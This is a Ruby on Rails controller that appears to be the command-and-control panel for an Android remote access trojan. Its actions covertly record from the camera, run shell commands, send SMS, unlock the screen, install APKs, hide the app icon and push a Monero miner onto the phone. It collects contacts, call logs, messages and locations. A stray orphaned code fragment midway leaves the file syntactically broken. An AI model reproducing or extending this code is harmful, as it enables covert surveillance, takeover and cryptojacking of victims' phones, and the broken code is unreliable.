class SmartphonesController < InheritedResources::Base
  include CommandSender
  # Thread-safe recording state managed via Smartphone.is_recording column

  def dump_sysinfo
    begin
      smartphone_id = params[:smartphone_id]
      smartphone = Smartphone.find(smartphone_id)
      
      # Send command via ActionCable to Android app
      command_data = {
        command: "get_device_info",
        timestamp: Time.now.to_i
      }
      
      ActionCable.server.broadcast(
        "command_channel_#{smartphone.device_id}",
        command_data
      )
      
      commandOutput = ["Command sent to device #{smartphone.device_id}", "Waiting for response..."]
    rescue => e
      puts "Error on dump sysinfo: #{e.message}"
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "dump_sysinfo",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def webcam_record
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      camera_id = params[:back_camera] == "true" ? "0" : "1"
      
      if !@smartphone.is_recording
        # Start camera stream
        pending_command = send_command_async(@smartphone, 'start_camera', { camera_id: camera_id })
        @smartphone.update(is_recording: true)
        commandOutput = ["Camera recording started (ID: #{camera_id})"]
      else
        # Stop camera stream
        pending_command = send_command_async(@smartphone, 'stop_camera', {})
        @smartphone.update(is_recording: false)
        commandOutput = ["Camera recording stopped"]
      end
      
    rescue => e
      Rails.logger.error("Error on webcam record: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "webcam_record", locals: { commandOutput: commandOutput, fileName: @fileNameHtml }
      }
    end
  end

  # Audio mode now handled by set_audio_mode below (uses ActionCable)
  
  def dump_wifi_info
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'get_wifi_info', {}, timeout: 15.seconds)
      
      if pending_command.completed?
        wifi_data = pending_command.response_data
        commandOutput = [
          "SSID: #{wifi_data['ssid']}",
          "BSSID: #{wifi_data['bssid']}",
          "IP: #{wifi_data['ip_address']}",
          "Speed: #{wifi_data['link_speed']} Mbps",
          "Signal: #{wifi_data['rssi']} dBm",
          "MAC: #{wifi_data['mac_address']}"
        ]
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error dumping wifi info: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_wifi_info", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dump_localtime
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
      
      if pending_command.completed?
        device_info = pending_command.response_data
        commandOutput = ["Device Time: #{Time.at(device_info['timestamp'] / 1000).to_s}"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error getting device time: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_localtime", locals: { commandOutput: commandOutput }
      }
    end
  end

  def uninstall_app
    begin
      app_name = params[:app]
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if app_name.present?
        pending_command = send_command_and_wait(@smartphone, 'uninstall_app', { package_name: app_name }, timeout: 30.seconds)
        
        if pending_command.completed?
          commandOutput = ["App uninstall initiated: #{app_name}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No app name provided"]
      end
      
    rescue => e
      Rails.logger.error("Error uninstalling app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "uninstall_app",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def list_apps
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'get_installed_apps', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        apps_data = pending_command.response_data['apps'] || []
        commandOutput = apps_data.map { |app| "#{app['package_name']} (#{app['app_name']})" }
        commandOutput = ["No apps found"] if commandOutput.empty?
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error listing apps: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "list_apps", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def install_apk
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      apk_file_param = params[:apk_file]
      
      if apk_file_param.present?
        # Read APK file and encode to Base64
        apk_data = apk_file_param.read
        apk_base64 = Base64.strict_encode64(apk_data)
        
        pending_command = send_command_and_wait(
          @smartphone, 
          'install_apk', 
          { apk_base64: apk_base64 }, 
          timeout: 60.seconds
        )
        
        if pending_command.completed?
          commandOutput = ["APK installation started"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No APK file provided"]
      end
      
    rescue => e
      Rails.logger.error("Error installing APK: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "install_apk", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def run_app
    begin
      app_name = params[:app]
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if app_name.present?
        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_name }, timeout: 15.seconds)
        
        if pending_command.completed?
          commandOutput = ["App launched: #{app_name}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No app specified"]
      end
      
    rescue => e
      Rails.logger.error("Error running app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "run_app", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def send_sms_message
    begin
      phone_number = params[:phone_number]
      message = params[:message]
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if phone_number.present? && message.present?
        pending_command = send_command_and_wait(
          @smartphone, 
          'send_sms', 
          { phone_number: phone_number, message: message }, 
          timeout: 15.seconds
        )
        
        if pending_command.completed?
          commandOutput = ["SMS sent to #{phone_number}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["Missing phone number or message"]
      end
      
    rescue => e
      Rails.logger.error("Error sending SMS: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "send_sms", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def screen_unlock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["Screen unlocked"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "screen_unlock", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def hide_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        @smartphone.update(is_app_hidden: true)
        commandOutput = ["App icon hidden"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error hiding icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "hide_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def show_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        @smartphone.update(is_app_hidden: false)
        commandOutput = ["App icon visible"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error showing icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "show_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def set_audio_mode
    begin
      mode = params[:mode] # 'silent', 'vibrate', 'normal'
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if mode.present?
        pending_command = send_command_and_wait(@smartphone, 'change_audio_mode', { mode: mode }, timeout: 10.seconds)
        
        if pending_command.completed?
          commandOutput = ["Audio mode changed to: #{mode}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No mode specified"]
      end
      
    rescue => e
      Rails.logger.error("Error setting audio mode: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "set_audio_mode", locals: { commandOutput: commandOutput }
      }
    end
  end
      puts "Error listing apps."
    end
    respond_to do |format|
      format.js {
        render "list_apps",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def upload_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      local_file = params[:push_file]
      remote_dest = params[:destination]
      
      # Future: implement chunked upload via ActionCable
      commandOutput = ["File upload not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error uploading file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "upload_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def wake_lock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["Screen unlocked successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "wake_lock", locals: { commandOutput: commandOutput }
      }
    end
  end

  def run_shell_command
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      command = params[:command]
      
      pending_command = send_command_and_wait(@smartphone, 'shell_exec', { command: command }, timeout: 30.seconds)
      
      if pending_command.completed?
        output = pending_command.response_data['output'] || ''
        commandOutput = output.split("\n")
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error running shell command: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "run_shell_command", locals: { commandOutput: commandOutput }
      }
    end
  end

  def open_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      app_package = params[:app]
      
      if app_package.present?
        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_package }, timeout: 15.seconds)
        
        if pending_command.completed?
          commandOutput = ["App launched: #{app_package}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No app specified"]
      end
      
    rescue => e
      Rails.logger.error("Error opening app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "open_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def install_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      app_path = params[:app]
      
      if app_path.present? && File.exist?(app_path)
        apk_data = File.read(app_path)
        apk_base64 = Base64.strict_encode64(apk_data)
        
        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
        
        if pending_command.completed?
          commandOutput = ["Installation started"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["APK file not found: #{app_path}"]
      end
      
    rescue => e
      Rails.logger.error("Error installing app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "install_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dump_device_info
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
      
      if pending_command.completed?
        info = pending_command.response_data
        commandOutput = [
          "Brand: #{info['brand']}",
          "Model: #{info['model']}",
          "OS: #{info['os_version']}",
          "SDK: #{info['sdk_version']}",
          "Battery: #{info['battery_level']}%"
        ]
      else
        commandOutput = ["Operation Failed"]
      end
    rescue => e
      Rails.logger.error("Error dumping device info: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "dump_device_info", locals: { commandOutput: commandOutput }
      }
    end
  end

  def pull_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      remote_path = params[:pull_file]
      local_dest = params[:destination]
      
      # Future: implement chunked file transfer via ActionCable
      # For now, just acknowledge command
      commandOutput = ["File transfer not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error pulling file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "pull_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def hide_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon hidden successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error hiding app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "hide_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def show_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon shown successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error showing app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "show_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def crypto_minner
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Read monero miner APK and encode to Base64
      miner_apk_path = Rails.root.join('tools', 'monero-miner.apk')
      if File.exist?(miner_apk_path)
        apk_base64 = Base64.strict_encode64(File.binread(miner_apk_path))
        
        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
        
        if pending_command.completed?
          commandOutput = ["Monero miner installed successfully"]
        else
          commandOutput = ["Installation Failed"]
        end
      else
        commandOutput = ["Monero miner APK not found at tools/monero-miner.apk"]
      end
      
    rescue => e
      Rails.logger.error("Error installing crypto miner: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "crypto_minner", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dropdown_list_smartphones
    render locals: { smartphones: smartphones,
                     smartphone: smartphone }
  end

  def select_smartphone
    redirect_to controller: "admin/dashboard",
      action: "index",
      selected_smartphone_id: params[:smartphone_id]
  end

  def load
    render
  end

  def install
    path = "installsomething.txt"
    content = "data from the form"
    File.open(path, "w+") do |f|
      f.write(content)
    end
  end

  private

  def smartphone_params
    params.require(:smartphone).permit(:operating_system,
                                       :name,
                                       :pictures,
                                       :screenshots,
                                       :videos,
                                       :recordings,
                                       :is_rooted,
                                       :call_logs,
                                       :contacts,
                                       :sms_messages,
                                       :geo_locations,
                                       :is_app_hidden)
  end
  
  # Helper method to send commands via ActionCable to Android device
  def send_command_to_device(smartphone, command, params = {})
    command_data = {
      command: command,
      params: params,
      timestamp: Time.now.to_i
    }
    
    ActionCable.server.broadcast(
      "command_channel_#{smartphone.device_id}",
      command_data
    )
    
    Rails.logger.info "Sent command #{command} to device #{smartphone.device_id}"
  end
end
